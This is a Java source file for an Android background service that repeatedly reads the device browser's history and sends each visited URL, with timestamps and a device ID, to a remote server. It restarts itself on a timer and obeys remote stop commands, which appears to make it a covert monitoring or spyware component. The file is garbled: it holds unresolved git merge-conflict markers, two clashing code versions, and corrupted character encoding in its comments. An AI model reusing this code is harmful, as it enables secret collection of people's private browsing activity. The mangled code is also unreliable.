package com.inet.android.history;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.Browser;

import com.inet.android.request.DataRequest;
import com.inet.android.utils.Logging;
import com.inet.android.utils.WorkTimeDefiner;

/**
 * –ö–ª–∞—Å—Å —Å–±–æ—Ä–∞ –∏—Å—Ç–æ—Ä–∏–∏ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–≥–æ –±—Ä–∞—É–∑–µ—Ä–∞
 * 
 * @author johny homicide
 * 
 */
public class LinkService extends Service {

<<<<<<< HEAD
	private static final int SERVICE_REQUEST_CODE = 25; // —É–Ω–∏–∫–∞–ª—å–Ω—ã–π int
														// —Å–µ—Ä–≤–∏—Å–∞
=======
	private static final int SERVICE_REQUEST_CODE = 25; // ÛÌËÍ‡Î¸Ì˚È int ÒÂ‚ËÒ‡
>>>>>>> refs/remotes/origin/war
	final String LOG_TAG = "historyService";
	SharedPreferences sPref;
	final String SAVED_TIME = "saved_time";
	private Context context;
	private SharedPreferences sp;

	public void onCreate() {
		super.onCreate();
		startService(new Intent(this, LinkService.class));

		Logging.doLog(LOG_TAG, "onCreate", "onCreate");

		context = getApplicationContext();
		sp = PreferenceManager.getDefaultSharedPreferences(context);

	}

	public int onStartCommand(Intent intent, int flags, int startId) {
<<<<<<< HEAD
=======
		Log.d(LOG_TAG, "onStartCommand - " + sp.getString("ID", "ID"));
		FileLog.writeLog(LOG_TAG + " -> onStartCommand - " + sp.getString("ID", "ID"));
		
		sp = PreferenceManager.getDefaultSharedPreferences(this);
		String linkEnd = sp.getString("ACTION", "OK");
>>>>>>> refs/remotes/origin/war

<<<<<<< HEAD
		Logging.doLog(LOG_TAG,
				"onStartCommand - " + sp.getString("account", "ID"),
				"onStartCommand - " + sp.getString("account", "ID"));

		sp = PreferenceManager.getDefaultSharedPreferences(this);
		String linkEnd = sp.getString("code", "2");

		if (linkEnd.equals("3")) {
			Logging.doLog(LOG_TAG, "code : 3", "code : 3");

			return 0;
		}

=======
		if (linkEnd.equals("REMOVE")) {
			Log.d(LOG_TAG, "REMOVE");
			FileLog.writeLog("historyService -> REMOVE");
			
			return 0;
		}
		
>>>>>>> refs/remotes/origin/war
		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, Integer.parseInt(sp.getString("period", "1")));// —á–µ—Ä–µ–∑
																				// 1
																				// –º–∏–Ω—É—Ç

		PendingIntent servicePendingIntent = PendingIntent.getService(this,
				SERVICE_REQUEST_CODE, new Intent(this, LinkService.class),
				PendingIntent.FLAG_UPDATE_CURRENT);

		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
				servicePendingIntent);
<<<<<<< HEAD

		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
		if (!isWork) {
			Logging.doLog(LOG_TAG,
					"isDoWork return " + Boolean.toString(isWork),
					"isDoWork return " + Boolean.toString(isWork));

			return Service.START_STICKY;
		} else {
			Logging.doLog(LOG_TAG,
					"isDoWork return " + Boolean.toString(isWork),
					"isDoWork return " + Boolean.toString(isWork));
		}

		linkTask(); // –ø—Ä–æ—Å–æ–º–æ—Ç—Ä –∏—Å—Ç–æ—Ä–∏–∏ –±—Ä–∞—É–∑–µ—Ä–∞

=======
				
		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
		if (!isWork) {
			Log.d(LOG_TAG, "isDoWork return " + Boolean.toString(isWork));
			FileLog.writeLog("historyService -> isWork return " + Boolean.toString(isWork));
			
			return Service.START_STICKY;
		} else {
			Log.d(LOG_TAG, "isDoWork return " + Boolean.toString(isWork));
			FileLog.writeLog("historyService -> isDoWork return " + Boolean.toString(isWork));
		}
		
		linkTask(); // ÔÓÒÓÏÓÚ ËÒÚÓËË ·‡ÛÁÂ‡
		
>>>>>>> refs/remotes/origin/war
		super.onStartCommand(intent, flags, startId);
		return Service.START_STICKY;
	}

	public void onDestroy() {
		super.onDestroy();
<<<<<<< HEAD

		Logging.doLog(LOG_TAG, "onDestroy", "onDestroy");
=======
		
		Log.d(LOG_TAG, "onDestroy");
		FileLog.writeLog("historyService -> onDestroy");
>>>>>>> refs/remotes/origin/war
	}

	public IBinder onBind(Intent intent) {
<<<<<<< HEAD
=======
		Log.d(LOG_TAG, "onBind");
		FileLog.writeLog("historyService -> onBind");
		
>>>>>>> refs/remotes/origin/war
		return null;
	}

	@SuppressLint("SimpleDateFormat")
	void linkTask() {

		String[] proj = new String[] { Browser.BookmarkColumns.TITLE,
				Browser.BookmarkColumns.URL, Browser.BookmarkColumns.DATE };
		String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 - history,
																// 1 = bookmark
		Cursor mCur = getContentResolver().query(Browser.BOOKMARKS_URI, proj,
				sel, null, null);
		mCur.moveToFirst();
<<<<<<< HEAD
=======
		
		sPref = PreferenceManager.getDefaultSharedPreferences(context);
>>>>>>> refs/remotes/origin/war

<<<<<<< HEAD
		sPref = PreferenceManager.getDefaultSharedPreferences(context);

=======
>>>>>>> refs/remotes/origin/war
		String urlDate = "";
		String url = "";

		if (mCur.moveToFirst() && mCur.getCount() > 0) {
			boolean cont = true;
			while (mCur.isAfterLast() == false && cont) {
				urlDate = mCur.getString(mCur
						.getColumnIndex(Browser.BookmarkColumns.DATE));
				Context context = getApplicationContext();
<<<<<<< HEAD

=======
				
				// Create a DateFormatter object for displaying date in
				// specified format.
>>>>>>> refs/remotes/origin/war
				DateFormat formatter = new SimpleDateFormat(
						"yyyy-MM-dd HH:mm:ss");

				String savedTime = sPref.getString(SAVED_TIME, "");

				Calendar calendar = Calendar.getInstance();
				calendar.setTimeInMillis(Long.parseLong(savedTime));

				if (Long.parseLong(urlDate) > Long.parseLong(savedTime)) {

<<<<<<< HEAD
					Logging.doLog(LOG_TAG,
							"--- "
									+ formatter.format(calendar.getTime())
											.toString(), "--- "
									+ formatter.format(calendar.getTime())
											.toString());
=======
					Log.d(LOG_TAG, "--- "
							+ formatter.format(calendar.getTime()).toString());
					FileLog.writeLog("historyService -> "
							+ formatter.format(calendar.getTime()).toString());
>>>>>>> refs/remotes/origin/war

					calendar = Calendar.getInstance();
					calendar.setTimeInMillis(Long.parseLong(urlDate));

					url = mCur.getString(mCur
							.getColumnIndex(Browser.BookmarkColumns.URL));

<<<<<<< HEAD
					String urlDateInFormat = formatter.format(
							calendar.getTime()).toString();
=======
					String urlDateInFormat = formatter.format(calendar.getTime())
							.toString();
>>>>>>> refs/remotes/origin/war

<<<<<<< HEAD
					String sendJSONStr = null;
					JSONObject jsonObject = new JSONObject();
					JSONArray data = new JSONArray();
					JSONObject info = new JSONObject();
					JSONObject object = new JSONObject();
					try {

						info.put("url", url);
						info.put("duration", "30");

						object.put("time", urlDateInFormat);
						object.put("type", "7");
						object.put("info", info);
						data.put(object);
						jsonObject.put("data", data);
						// sendJSONStr = jsonObject.toString();
						sendJSONStr = data.toString();
					} catch (JSONException e) {
						Logging.doLog(LOG_TAG, "json —Å–ª–æ–º–∞–ª—Å—è", "json —Å–ª–æ–º–∞–ª—Å—è");
					}

					DataRequest dr = new DataRequest(context);
					dr.sendRequest(object.toString());
=======
					String sendStr = "<packet><id>" + sp.getString("ID", "ID") + "</id><time>" + urlDateInFormat
							+ "</time><type>4</type><app>"
							+ "»ÌÚÂÌÂÚ-·‡ÛÁÂ</app><url>" + url
							+ "</url><ntime>" + "30"
							+ "</ntime></packet>";
					req = new Request(context);
					req.sendRequest(sendStr);
>>>>>>> refs/remotes/origin/war

					Editor ed = sPref.edit();
					ed.putString(SAVED_TIME, urlDate);
					ed.commit();
<<<<<<< HEAD

					Logging.doLog(LOG_TAG, formatter.format(calendar.getTime())
							.toString() + " - " + url,
							formatter.format(calendar.getTime()).toString()
									+ " - " + url);
=======
					
					Log.d(LOG_TAG, formatter.format(calendar.getTime())
							.toString() + " - " + url);
					FileLog.writeLog("historyService ->  "
							+ formatter.format(calendar.getTime()).toString() + " - " + url);
>>>>>>> refs/remotes/origin/war
				}
				mCur.moveToNext();
			}
		}
		mCur.close();
	}
}
